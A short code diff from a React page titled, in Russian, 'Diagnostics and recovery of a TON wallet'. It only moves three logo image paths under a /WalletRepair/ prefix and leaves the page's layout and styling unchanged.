@@ -52,15 +52,15 @@ function Page1_Hello() {
   <div style={{display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 32}}>
           {/* Новая иконка слева */}
           <div className="logo-container">
-            <img src="/wallet-ring.png" alt="wallet-ring" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
+            <img src="/WalletRepair/wallet-ring.png" alt="wallet-ring" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
           </div>
           {/* Основная иконка кошелька 1 */}
           <div className="logo-container">
-            <img src="/blue-cube.png" alt="cube" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
+            <img src="/WalletRepair/blue-cube.png" alt="cube" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
           </div>
           {/* Иконка кошелька 2 справа */}
           <div className="logo-container">
-            <img src="/blue-cube2.png" alt="wallet2" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
+            <img src="/WalletRepair/blue-cube2.png" alt="wallet2" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
           </div>
         </div>
   <h1 className="main-title">Диагностика и восстановление<br/>TON-кошелька</h1>
